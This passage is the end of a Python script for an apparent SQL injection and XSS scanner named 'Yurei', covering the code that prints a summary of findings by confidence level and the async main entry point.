            table.add_row("High Confidence (>70%)", str(len([f for f in self.findings if f.confidence > 70])))
            table.add_row("Medium Confidence (40-70%)", str(len([f for f in self.findings if 40 <= f.confidence <= 70])))
            table.add_row("Low Confidence (<40%)", str(len([f for f in self.findings if f.confidence < 40])))
            console.print(table)
        else:
            print("\n" + "="*50)
            print("SCAN SUMMARY")
            print("="*50)
            print(f"Targets Scanned: {len(self.target_urls)}")
            print(f"Total Findings: {len(self.findings)}")
            print(f"SQL Injection Findings: {len([f for f in self.findings if 'sqli' in f.injection_type])}")
            print(f"XSS Findings: {len([f for f in self.findings if 'sqli' not in f.injection_type])}")
            print(f"High Confidence (>70%): {len([f for f in self.findings if f.confidence > 70])}")
            print(f"Medium Confidence (40-70%): {len([f for f in self.findings if 40 <= f.confidence <= 70])}")
            print(f"Low Confidence (<40%): {len([f for f in self.findings if f.confidence < 40])}")
            print("="*50)

async def main():
    """Main entry point"""
    # Handle Ctrl+C gracefully
    def signal_handler(sig, frame):
        console.log("\n[!] Scan interrupted by user")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    # Parse command line arguments
    cli = YureiCLI()
    args = cli.parse_args()
    # Create and run Yurei
    yurei = Yurei(args)
    await yurei.run()

if __name__ == "__main__":
    # Run async main
    asyncio.run(main())
